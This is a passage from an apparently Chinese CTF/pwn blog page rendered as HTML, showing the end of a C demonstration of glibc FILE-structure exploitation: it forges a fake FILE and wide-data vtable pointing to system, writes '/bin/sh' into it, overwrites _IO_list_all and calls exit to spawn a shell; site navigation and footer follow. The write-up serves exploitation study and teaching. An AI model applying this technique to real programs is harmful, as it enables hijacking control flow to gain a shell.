class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x216000</span>; <span class="comment">// vtable</span></span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    fake_vtable[<span class="number">0x68</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WDOALLOCATE调用的函数指针，偏移量可通过查看汇编获取</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh);</span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> exploit_mode == 3</span></span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_wide_data = fake_wide_data;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xD8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215AC0</span> + <span class="number">0x28</span>; <span class="comment">// vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0xE0</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)fake_vtable;   <span class="comment">// _wide_data-&gt;_wide_vtable</span></span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE-&gt;_wide_data)[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;     <span class="comment">// _wide_data-&gt;_IO_write_ptr, o+0x20</span></span><br><span class="line">    fake_vtable[<span class="number">0x18</span> / <span class="number">8</span>] = (<span class="type">size_t</span>)system;     <span class="comment">// _IO_WOVERFLOW调用的函数指针</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)fake_FILE, binsh2);       <span class="comment">// sh =&gt; 0x6873, 0x6873 &amp; 0x800 != 0</span></span><br><span class="line"></span><br><span class="line">    *(_IO_list_all) = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">163</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">23:01</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
